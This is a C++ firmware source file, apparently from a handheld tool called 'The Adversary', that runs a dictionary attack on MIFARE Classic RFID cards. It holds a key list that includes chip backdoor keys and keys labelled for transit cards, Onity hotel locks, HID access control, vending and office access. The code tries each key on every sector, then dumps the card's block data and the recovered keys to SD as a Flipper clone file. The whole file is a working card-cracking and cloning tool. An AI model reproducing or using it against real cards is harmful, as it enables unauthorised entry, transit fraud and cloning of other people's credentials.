/**
 * @file rfid_audit.cpp
 * @brief RfidAudit implementation
 */

#include "rfid_audit.h"
#include <ArduinoJson.h>
#include <SD.h>

namespace adversary {

const uint8_t RfidAudit::DEFAULT_KEYS[][6] = {
    // === Core Defaults ===
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // Default Factory (Key A & B)
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // Blank
    {0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5}, // NFC Forum MAD Key A
    {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5}, // NFC Forum MAD Key B
    {0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7}, // NDEF / Wien Key A
    
    // === Common Key B Defaults ===
    {0x01, 0x01, 0x01, 0x01, 0x01, 0x01}, // Common Key B 1
    {0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC}, // Common Key B hex sequence
    {0xAB, 0xCD, 0xEF, 0x12, 0x34, 0x56}, // Common Key B alt
    {0xA5, 0xA5, 0xA5, 0xA5, 0xA5, 0xA5}, // Alternating pattern
    {0x5A, 0x5A, 0x5A, 0x5A, 0x5A, 0x5A}, // Alternating pattern inv
    
    // === Common Sequences ===
    {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF}, // Common
    {0x01, 0x02, 0x03, 0x04, 0x05, 0x06}, // Sequential
    {0x11, 0x11, 0x11, 0x11, 0x11, 0x11}, // All Ones
    {0x88, 0x88, 0x88, 0x88, 0x88, 0x88}, // All Eights
    {0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0}, // Gradient
    {0xA1, 0xB1, 0xC1, 0xD1, 0xE1, 0xF1}, // Gradient Alt
    
    // === Backdoor Keys (FM11RF08 clones) ===
    {0xA3, 0x96, 0xEF, 0xA4, 0xE2, 0x4F}, // FM11RF08S Universal Backdoor
    {0xA3, 0x16, 0x67, 0xA8, 0xCE, 0xC1}, // FM11RF08 Older Backdoor
    
    // === Access Control / HID ===
    {0x4D, 0x3A, 0x99, 0xC3, 0x51, 0xDD}, // MAD
    {0x1A, 0x98, 0x2C, 0x7E, 0x45, 0x9A}, // Mifare.net
    {0x71, 0x4C, 0x5C, 0x88, 0x6E, 0x97}, // HID Prox
    {0x58, 0x7E, 0xE5, 0xF9, 0x35, 0x0F}, // HID Corp
    
    // === Transit Cards ===
    {0xFC, 0x00, 0x01, 0x87, 0x78, 0xF7}, // Västtrafiken/RKF
    {0x54, 0x72, 0x61, 0x76, 0x65, 0x6C}, // "Travel" ASCII
    {0x50, 0x52, 0x49, 0x56, 0x41, 0x41}, // JOJO PRIVA Key A
    {0x50, 0x52, 0x49, 0x56, 0x41, 0x42}, // JOJO PRIVA Key B
    {0x6A, 0x19, 0x87, 0xC4, 0x0A, 0x21}, // Metrocard
    {0x2B, 0x7F, 0x82, 0x15, 0x02, 0xC1}, // Suica/Pasmo
    
    // === Hotel Systems ===
    {0x8A, 0x19, 0xD4, 0x0C, 0xF2, 0xB5}, // Onity S1 A/B
    {0x50, 0x52, 0x09, 0x01, 0x6A, 0x1F}, // Hotel System
    {0x44, 0xAB, 0x09, 0x01, 0x08, 0x45}, // Hotel System 2
    {0xD3, 0xB5, 0x95, 0xE9, 0xDD, 0x63}, // Hotel KeyCard
    
    // === Vending / Payment ===
    {0x4B, 0x0B, 0x20, 0x10, 0x7C, 0xCB}, // TNP3xxx
    {0x60, 0x5F, 0x5E, 0x5D, 0x5C, 0x5B}, // Access Control
    {0x19, 0x94, 0x04, 0x28, 0x19, 0x70}, // NSP Global UK Key A
    {0x19, 0x94, 0x04, 0x28, 0x19, 0x98}, // NSP Global UK Key B
    {0xE5, 0x6A, 0xC1, 0x27, 0xDD, 0x45}, // Snack Machine
    {0x31, 0x5D, 0x42, 0xF9, 0xC2, 0xA9}, // Vending Key B
    
    // === Gym / Fitness ===
    {0xA0, 0x5D, 0xBD, 0x98, 0xE0, 0xFC}, // CleverFit
    {0xAA, 0x4D, 0xDA, 0x45, 0x8E, 0xBB}, // GoFit
    
    // === Laundry / Access ===
    {0xA7, 0x3F, 0x58, 0x21, 0xD4, 0x86}, // Laundry Card
    {0x48, 0xFF, 0xE6, 0x89, 0xC0, 0x80}, // Office Access
};

const char* RfidAudit::KEY_NAMES[] = {
    // Core Defaults
    "Default Factory",
    "Blank",
    "NFC Forum MAD A",
    "NFC Forum MAD B",
    "NDEF/Wien",
    // Common Key B Defaults
    "Common B 1",
    "Hex Sequence",
    "Common B Alt",
    "Alternating A5",
    "Alternating 5A",
    // Common Sequences
    "Common Seq",
    "Sequential",
    "All Ones",
    "All Eights",
    "Gradient",
    "Gradient Alt",
    // Backdoor
    "FM11RF08S Backdoor",
    "FM11RF08 Backdoor",
    // Access Control
    "MAD",
    "Mifare.net",
    "HID Prox",
    "HID Corp",
    // Transit
    "Vasttrafiken/RKF",
    "Travel ASCII",
    "JOJO PRIVA A",
    "JOJO PRIVA B",
    "Metrocard",
    "Suica/Pasmo",
    // Hotel
    "Onity S1",
    "Hotel System",
    "Hotel System 2",
    "Hotel KeyCard",
    // Vending
    "TNP3xxx",
    "Access Control",
    "NSP Global UK A",
    "NSP Global UK B",
    "Snack Machine",
    "Vending Key B",
    // Gym
    "CleverFit",
    "GoFit",
    // Laundry
    "Laundry Card",
    "Office Access",
};

const size_t RfidAudit::NUM_DEFAULT_KEYS = sizeof(DEFAULT_KEYS) / 6;

RfidAudit::RfidAudit(MFRC522_I2C* rfid) 
    : m_rfid(rfid)
    , m_auditDurationMs(0)
    , m_dataReadEnabled(false) {
    memset(m_dumpFilename, 0, sizeof(m_dumpFilename));
}

int RfidAudit::runDictionaryAttack(
    std::function<void(const AuditProgressInfo&)> onProgress,
    const AuditOptions& opts
) {
    if (!m_rfid) return 0;
    
    // Store options for summary
    m_dataReadEnabled = opts.readData;
    if (opts.dumpPath) {
        strncpy(m_dumpFilename, opts.dumpPath, sizeof(m_dumpFilename) - 1);
    }
    
    uint32_t auditStartMs = millis();
    m_results.clear();
    
    // Check if tag is MIFARE Classic (SAK 0x08, 0x09, 0x18, 0x11, 0x01, 0x28 etc are standard MIFARE)
    // SAK 0x20 is ISO 14443-4 (DESFire, Phone, etc) and DOES NOT support MIFARE Classic AUTH commands.
    uint8_t sak = m_rfid->uid.sak;
    if (sak & 0x20) {
        Serial.printf("[RFID] Audit Error: Incompatible tag type (SAK: 0x%02X). ISO 14443-4 not supported for MIFARE audit.\n", sak);
        return -1; // Specific error code for incompatible type
    }
    int keysFound = 0;
    
    AuditProgressInfo progressLine;
    memset(&progressLine, 0, sizeof(progressLine));
    progressLine.elapsedMs = 0;
    
    // Open file for streaming if readData is enabled
    File dumpFile;
    if (opts.readData && opts.dumpPath) {
        dumpFile = SD.open(opts.dumpPath, FILE_WRITE);
        if (dumpFile) {
            // Write Flipper .nfc file header
            dumpFile.println("Filetype: Flipper NFC device");
            dumpFile.println("Version: 4");
            dumpFile.println("Device type: MIFARE Classic");
            
            // UID
            dumpFile.print("UID: ");
            for (byte i = 0; i < m_rfid->uid.size; i++) {
                dumpFile.printf("%02X", m_rfid->uid.uidByte[i]);
                if (i < m_rfid->uid.size - 1) dumpFile.print(" ");
            }
            dumpFile.println();
            
            dumpFile.printf("ATQA: %02X %02X\n", 0x00, 0x04);  // Standard MIFARE
            dumpFile.printf("SAK: %02X\n", sak);
            dumpFile.println("Mifare Classic type: 1K");
        }
    }
    
    // Critical: Wake up the card from any potential HALT/SILENT state
    bool selected = false;
    for (int retry = 0; retry < 5; retry++) {
        m_rfid->PCD_StopCrypto1();
        m_rfid->PICC_HaltA(); // Force tag to a known state (HALT)
        delay(20);
        
        byte bufferATQA[2];
        byte bufferSize = sizeof(bufferATQA);
        
        // Try WUPA (to wake from HALT)
        MFRC522_I2C::StatusCode status = (MFRC522_I2C::StatusCode)m_rfid->PICC_WakeupA(bufferATQA, &bufferSize);
        
        if (status != MFRC522_I2C::STATUS_OK) {
            // Fallback: Try REQA (to wake from IDLE if it wasn't halted properly)
            status = (MFRC522_I2C::StatusCode)m_rfid->PICC_RequestA(bufferATQA, &bufferSize);
        }
        
        if (status == MFRC522_I2C::STATUS_OK || status == MFRC522_I2C::STATUS_COLLISION) {
            if (m_rfid->PICC_ReadCardSerial()) {
                selected = true;
                break;
            }
        }
        delay(30 * (retry + 1));
    }

    if (!selected) {
        Serial.println("[RFID] Audit Error: Card not responding to WUPA");
        if (dumpFile) dumpFile.close();
        return 0;
    }

    const int numSectors = 16;
    for (int s = 0; s < numSectors; s++) {
        MifareSectorData sectorData;
        sectorData.sector = s;
        sectorData.keyAFound = false;
        sectorData.keyBFound = false;
        sectorData.keyAIndex = 255;  // 255 = not found
        sectorData.keyBIndex = 255;
        
        uint8_t firstBlock = s * 4;
        
        // CRITICAL: Re-select card at start of each sector (except sector 0) to reset state
        // After a successful auth, the card stays in authenticated state for that sector.
        // We must wake it up fresh before trying a new sector.
        // Skip for sector 0 since we just did the initial wake-up before the loop.
        if (s > 0) {
            m_rfid->PCD_StopCrypto1();
            byte bufferATQA[2];
            byte bufferSize = sizeof(bufferATQA);
            m_rfid->PICC_WakeupA(bufferATQA, &bufferSize);
            m_rfid->PICC_ReadCardSerial();
        }
        
        // Try Key A
        progressLine.currentSector = s;
        progressLine.isKeyB = false;
        
        for (size_t k = 0; k < NUM_DEFAULT_KEYS; k++) {
            uint8_t currentKey[6];
            memcpy(currentKey, DEFAULT_KEYS[k], 6);
            
            if (tryKey(firstBlock, currentKey, true)) {
                Serial.printf("[RFID] Sector %d: Key A FOUND (key idx %d)\n", s, k);
                sectorData.keyAFound = true;
                sectorData.keyAIndex = k;  // Store which key matched
                memcpy(sectorData.keyA, currentKey, 6);
                keysFound++;
                progressLine.keysFound = keysFound;
                progressLine.sectorResults[s][0] = true;
                progressLine.elapsedMs = millis() - auditStartMs;
                
                if (onProgress) onProgress(progressLine);
                break;
            }
            
            if (onProgress) {
                progressLine.overallProgress = (float)(s * NUM_DEFAULT_KEYS * 2 + k) / (numSectors * NUM_DEFAULT_KEYS * 2);
                progressLine.elapsedMs = millis() - auditStartMs;
                onProgress(progressLine);
            }
            
            // Periodically re-select to keep card alive if many failures
            if (k % 4 == 3) {
                m_rfid->PCD_StopCrypto1();
                m_rfid->PICC_IsNewCardPresent();
                m_rfid->PICC_ReadCardSerial();
            }
        }
        
        // Try Key B
        progressLine.isKeyB = true;
        
        // OPTIMIZATION: If Key A was found, try it as Key B first (often they're identical)
        if (sectorData.keyAFound) {
            if (tryKey(firstBlock, sectorData.keyA, false)) {
                Serial.printf("[RFID] Sector %d: Key B FOUND (same as Key A, idx %d)\n", s, sectorData.keyAIndex);
                sectorData.keyBFound = true;
                sectorData.keyBIndex = sectorData.keyAIndex;  // Same key as A
                memcpy(sectorData.keyB, sectorData.keyA, 6);
                keysFound++;
                progressLine.keysFound = keysFound;
                progressLine.sectorResults[s][1] = true;
                progressLine.elapsedMs = millis() - auditStartMs;
                if (onProgress) onProgress(progressLine);
            }
        }
        
        // If Key B still not found, try full dictionary
        if (!sectorData.keyBFound) {
            for (size_t k = 0; k < NUM_DEFAULT_KEYS; k++) {
                uint8_t currentKey[6];
                memcpy(currentKey, DEFAULT_KEYS[k], 6);
                
                if (tryKey(firstBlock, currentKey, false)) {
                    Serial.printf("[RFID] Sector %d: Key B FOUND (key idx %d)\n", s, k);
                    sectorData.keyBFound = true;
                    sectorData.keyBIndex = k;  // Store which key matched
                    memcpy(sectorData.keyB, currentKey, 6);
                    keysFound++;
                    progressLine.keysFound = keysFound;
                    progressLine.sectorResults[s][1] = true;
                    progressLine.elapsedMs = millis() - auditStartMs;
                    
                    if (onProgress) onProgress(progressLine);
                    break;
                }
                
                if (onProgress) {
                    progressLine.overallProgress = (float)(s * NUM_DEFAULT_KEYS * 2 + NUM_DEFAULT_KEYS + k) / (numSectors * NUM_DEFAULT_KEYS * 2);
                    progressLine.elapsedMs = millis() - auditStartMs;
                    onProgress(progressLine);
                }
            }
        }
        
        // Read block data if enabled and we have at least one key
        if (opts.readData && dumpFile && (sectorData.keyAFound || sectorData.keyBFound)) {
            // Choose which key to use for reading (prefer Key A)
            uint8_t* readKey = sectorData.keyAFound ? sectorData.keyA : sectorData.keyB;
            bool useKeyA = sectorData.keyAFound;
            
            MFRC522_I2C::MIFARE_Key mfKey;
            memcpy(mfKey.keyByte, readKey, 6);
            
            // Read all 4 blocks in this sector
            for (int block = 0; block < 4; block++) {
                uint8_t blockAddr = firstBlock + block;
                uint8_t buffer[18];
                uint8_t bufferSize = sizeof(buffer);
                
                // Authenticate for this block
                MFRC522_I2C::StatusCode status;
                if (useKeyA) {
                    status = (MFRC522_I2C::StatusCode)m_rfid->PCD_Authenticate(
                        MFRC522_I2C::PICC_CMD_MF_AUTH_KEY_A, blockAddr, &mfKey, &(m_rfid->uid));
                } else {
                    status = (MFRC522_I2C::StatusCode)m_rfid->PCD_Authenticate(
                        MFRC522_I2C::PICC_CMD_MF_AUTH_KEY_B, blockAddr, &mfKey, &(m_rfid->uid));
                }
                
                if (status == MFRC522_I2C::STATUS_OK) {
                    status = (MFRC522_I2C::StatusCode)m_rfid->MIFARE_Read(blockAddr, buffer, &bufferSize);
                    
                    if (status == MFRC522_I2C::STATUS_OK) {
                        // Write block data to file
                        dumpFile.printf("Block %d: ", blockAddr);
                        for (int i = 0; i < 16; i++) {
                            dumpFile.printf("%02X", buffer[i]);
                            if (i < 15) dumpFile.print(" ");
                        }
                        dumpFile.println();
                    } else {
                        // Write placeholder for unreadable block
                        dumpFile.printf("Block %d: ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??\n", blockAddr);
                    }
                } else {
                    dumpFile.printf("Block %d: ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ??\n", blockAddr);
                }
                
                m_rfid->PCD_StopCrypto1();
            }
            
            // Write keys to file
            dumpFile.printf("Key A: ");
            if (sectorData.keyAFound) {
                for (int i = 0; i < 6; i++) {
                    dumpFile.printf("%02X", sectorData.keyA[i]);
                    if (i < 5) dumpFile.print(" ");
                }
            } else {
                dumpFile.print("?? ?? ?? ?? ?? ??");
            }
            dumpFile.println();
            
            dumpFile.printf("Key B: ");
            if (sectorData.keyBFound) {
                for (int i = 0; i < 6; i++) {
                    dumpFile.printf("%02X", sectorData.keyB[i]);
                    if (i < 5) dumpFile.print(" ");
                }
            } else {
                dumpFile.print("?? ?? ?? ?? ?? ??");
            }
            dumpFile.println();
            dumpFile.println();  // Blank line between sectors
            
            // Re-select card after block reads
            m_rfid->PICC_WakeupA(nullptr, nullptr);
            m_rfid->PICC_ReadCardSerial();
        }
        
        // Debug: sector summary
        Serial.printf("[RFID] Sector %d done: A=%s B=%s\n", s, 
            sectorData.keyAFound ? "Y" : "N", 
            sectorData.keyBFound ? "Y" : "N");
        
        m_results.push_back(sectorData);
    }
    
    // Close dump file
    if (dumpFile) {
        dumpFile.close();
        Serial.printf("[RFID] Block data saved to: %s\n", opts.dumpPath);
    }
    
    m_auditDurationMs = millis() - auditStartMs;
    
    if (onProgress) {
        progressLine.overallProgress = 1.0f;
        progressLine.elapsedMs = m_auditDurationMs;
        onProgress(progressLine);
    }
    return keysFound;
}

bool RfidAudit::tryKey(uint8_t block, uint8_t* key, bool isKeyA) {
    if (!m_rfid) return false;

    MFRC522_I2C::MIFARE_Key mKey;
    memcpy(mKey.keyByte, key, 6);
    
    // Attempt authentication
    MFRC522_I2C::StatusCode status = (MFRC522_I2C::StatusCode)m_rfid->PCD_Authenticate(
        isKeyA ? MFRC522_I2C::PICC_CMD_MF_AUTH_KEY_A : MFRC522_I2C::PICC_CMD_MF_AUTH_KEY_B,
        block, &mKey, &(m_rfid->uid)
    );
    
    if (status == MFRC522_I2C::STATUS_OK) {
        m_rfid->PCD_StopCrypto1();
        return true;
    }
    
    // On any error, ensure crypto is stopped so next attempt can start fresh
    m_rfid->PCD_StopCrypto1();
    
    // If timeout or other error occurs, the card might have entered a weird state.
    // Re-verify presence.
    if (status != MFRC522_I2C::STATUS_OK) {
        byte bufferATQA[2];
        byte bufferSize = sizeof(bufferATQA);
        m_rfid->PICC_WakeupA(bufferATQA, &bufferSize);
        m_rfid->PICC_ReadCardSerial();
    }
    
    return false;
}

bool RfidAudit::saveToSD(const char* filename) {
    if (m_results.empty()) return false;
    
    char path[128];
    snprintf(path, sizeof(path), "/adversary/captures/rfid/%s.nfc", filename);
    
    // Ensure directory exists
    if (!SD.exists("/adversary/captures/rfid")) {
        SD.mkdir("/adversary/captures/rfid");
    }
    
    File file = SD.open(path, FILE_WRITE);
    if (!file) return false;
    
    file.println("Filetype: Flipper NFC device");
    file.println("Version: 3");
    file.println("# The Adversary RFID Dump");
    
    // Header (simplified for example)
    file.println("Device type: Mifare Classic 1K");
    
    for (const auto& s : m_results) {
        file.printf("# Sector %d\n", s.sector);
        if (s.keyAFound) {
            file.print("Key A: ");
            for (int i = 0; i < 6; i++) file.printf("%02X ", s.keyA[i]);
            file.println();
        }
        if (s.keyBFound) {
            file.print("Key B: ");
            for (int i = 0; i < 6; i++) file.printf("%02X ", s.keyB[i]);
            file.println();
        }
    }
    
    file.close();
    return true;
}

AuditSummary RfidAudit::getSummary() const {
    AuditSummary summary = {};
    
    for (const auto& sec : m_results) {
        if (sec.keyAFound) summary.totalKeysFound++;
        if (sec.keyBFound) summary.totalKeysFound++;
        
        if (sec.keyAFound && sec.keyBFound) {
            summary.sectorsFullyCracked++;
        } else if (sec.keyAFound || sec.keyBFound) {
            summary.sectorsPartiallyCracked++;
        } else {
            summary.sectorsUncracked++;
        }
    }
    
    summary.durationMs = m_auditDurationMs;
    summary.dataReadEnabled = m_dataReadEnabled;
    strncpy(summary.dumpFilename, m_dumpFilename, sizeof(summary.dumpFilename) - 1);
    
    return summary;
}

const char* RfidAudit::getKeyName(uint8_t keyIndex) {
    if (keyIndex < NUM_DEFAULT_KEYS) {
        return KEY_NAMES[keyIndex];
    }
    return "Unknown";
}

} // namespace adversary
